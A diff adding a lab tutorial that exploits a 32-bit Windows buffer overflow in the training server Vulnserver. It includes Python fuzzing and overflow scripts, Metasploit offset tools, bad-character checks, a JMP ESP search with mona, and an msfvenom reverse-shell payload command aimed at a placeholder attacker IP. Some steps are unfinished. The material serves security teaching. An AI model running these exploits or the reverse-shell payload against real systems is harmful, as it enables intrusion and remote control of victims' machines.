@@ -34,7 +34,192 @@ Let's say a function F1 calls the function F2, and the function F2 calls the fun
 
 // TODO FINISH EXAMPLE
 
-## Example
+## Windows 32-bits Buffer Overflow
+Vulnerable application:
+https://thegreycorner.com/vulnserver.html
+
+Run the vulnerable application as admin from Windows, the app runs on port 9999. Then run run as admin the Immunity debugger and attach to it (and press run as when attaching Immunity pauses the execution).
+
+### Spiking (from Kali attacker)
+Spiking is the process of fuzzing the app with inputs of many different lengths to try to break it to detect a buffer overflow.
+
+First, let's check the methods the vulnerable server provides:
+```
+kali@kali:~/buffer_overflow$ nc -nv 10.0.2.4 9999
+(UNKNOWN) [10.0.2.4] 9999 (?) open
+Welcome to Vulnerable Server! Enter HELP for help.
+HELP
+Valid Commands:
+HELP
+STATS [stat_value]
+RTIME [rtime_value]
+LTIME [ltime_value]
+SRUN [srun_value]
+TRUN [trun_value]
+GMON [gmon_value]
+GDOG [gdog_value]
+KSTET [kstet_value]
+GTER [gter_value]
+HTER [hter_value]
+LTER [lter_value]
+KSTAN [lstan_value]
+EXIT
+```
+
+In order to spike the methods the server provides, we'll use `generic_send_tcp`:
+```
+kali@kali:~$ generic_send_tcp
+argc=1
+Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
+./generic_send_tcp 192.168.1.100 701 something.spk 0 0
+```
+
+We need to specify the spike script for each method we want to test. In this case we know the TRUN method is vulnerable. We would check it like this:
+
+`trun_spike.spk`:
+```
+s_readline();
+s_string("TRUN ");
+s_string_variable("0");
+```
+
+Run it:
+```
+generic_send_tcp {{victim}} 9999 trun_splike.spk 0 0
+```
+
+Almost immediately the app crashes. If we check the value of the `EIP` registry on the debugger, it will contain 41414141, which is "AAAA". This indicates the instruction pointer was overwritten by the information sent by `generic_send_tcp`.
+
+### Fuzzing
+After we know which method of the protocol is vulnerable to buffer overflow, we have to detect what part of the input string is overwriting the EIP.
+
+This script will send requests, adding 100 bytes every time, to see when the app crashes to determine more or less whats the size of the input that makes the app crash. `1.py`:
+```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+    try:
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('10.0.2.4', 9999))
+        s.send(('TRUN /.:/' + buffer))
+        s.close()
+        sleep(1)
+        buffer = buffer + "A" * 100
+    except:
+        print "Fuzzing crashed at %s bytes" % str(len(buffer))
+        sys.exit()
+```
+
+Run it:
+```
+kali@kali:~/buffer_overflow$ ./1.py 
+^CFuzzing crashed at 2200 bytes
+```
+Note it has to be stopped manually.
+
+### Overwriting the EIP
+Once we know what is the approximate size of the input to make the app crash, generate using Metasploit's pattern creation to detect exactly what part overwrites the EIP. In this case we will create a 2500 bytes pattern:
+```
+kali@kali:~/buffer_overflow$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A... (continues)
+```
+
+Now the input to be sent is the generated pattern:
+```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = {{METASPLOIT PATTERN}}
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.0.2.4', 9999))
+s.send(('TRUN /.:/' + buffer))
+s.close()
+```
+
+The EIP value at the moment of the crash was `386F4337` this time. Then we'll proceed to search that value in the string created by metasploit using the tool `pattern_offset`:
+```
+kali@kali:~/buffer_overflow$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
+[*] Exact match at offset 2003
+```
+
+This means the offset is 2003 to reach the EIP. So we can use buffer = 2003 * "A" as the padding and the next 4 characters will be what we need EIP to be, in this case all Bs:
+```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+badchars = {{BADCHARS}}
+shellcode = "A" * 2003 + "B" * 4 + badchars
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.0.2.4', 9999))
+s.send(('TRUN /.:/' + shellcode))
+s.close()
+```
+
+It can be verified that the EIP registry has the value `42424242` at the moment of the crash, which is equivalent to `BBBB`.
+
+### Badchars detection
+Now we have control over the EIP registry, badchars have to be checked. Badchars are characters that are not suitable to be included in the shellcode, and the way of verifying it is to send all of them after the value that will overwrite the EIP registry, so that all of those values will be stored in memory. When any of them does not appear in memory, it means it is a bad character. Code:
+
+```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+badchars = {{BADCHARS}}
+shellcode = "A" * 2003 + "B" * 4 + badchars
+
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.0.2.4', 9999))
+s.send(('TRUN /.:/' + shellcode))
+s.close()
+```
+
+To check the badcharacters, go to the value of ESP on the Immunity debugger -> right click -> follow in dump. Check all the hexa values. They should start from the first character we sent. Next step is to see if we are missing characters, and in case we miss any that will be a bad character.
+
+download mona https://github.com/corelan/mona
+
+cp mona.py on Windows to C:/Program Files x86/Immunity Inc/Immunity Debugger/PyCommands
+
+then attach again from the debugger
+on the command white line write: `!mona modules`
+
+Get the 
+
+From Kali
+```
+kali@kali:~/repositories$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > JMP ESP
+00000000  FFE4              jmp esp
+```
+
+ON the debugger
+!mona find -s "FFE4"
+
+From the results, find a module that does not have any memory check (several "False"). In this case essfunc.dll:
+Log data, item 11
+ Address=625011AF
+ Message=  0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\User\repositories\vulnserver\essfunc.dll)
+
+Let's search for the location of the JMP ESP:
+
+!mona find -s "\xff\xe4" -m essfunc.dll
+
+Click the black arrow that points to the right and then go to the address 625011af
+Add a breakpoint there
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST={{attackerIP}} LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+
+## Linux Buffer Overflow
 This is a classic example of a C program that is vulnerable to buffer overflow attacks:
 ```C
 #include <stdio.h>
